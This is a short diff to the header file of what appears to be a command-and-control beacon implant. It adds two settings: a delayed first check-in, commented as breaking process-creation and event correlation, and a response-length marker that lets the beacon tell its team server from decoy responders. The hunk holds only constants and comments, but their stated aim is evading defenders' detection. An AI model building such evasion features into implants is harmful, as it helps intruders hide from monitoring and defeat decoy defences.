@@ -156,6 +156,15 @@ unsigned int bigger_rand();
 #define SETTING_UDC2_LENGTH    88
 #define SETTING_UDC2_ENTRY     89
 
+/* tier-3 item11: 4.13 checkin_delay - push the first check-in out by a
+ * profile-set delay (ms) to break process-creation/event correlation */
+#define SETTING_CHECKIN_DELAY  90
+/* tier-3 item11: 4.10 http-beacon data_required_length - the team server
+ * pads "nothing to do" 200 responses with exactly this many bytes so a
+ * decoy 200-with-no-body responder is distinguishable; the beacon treats
+ * a body of exactly this length as idle (channel.cpp/_http_get) */
+#define SETTING_DATA_REQUIRED_LENGTH 91
+
 /* 4.12 UDC2 (beacon_udc2.cpp) - beacon.h is included before windows.h
  * in some translation units, so spell the return types out */
 #ifdef __cplusplus
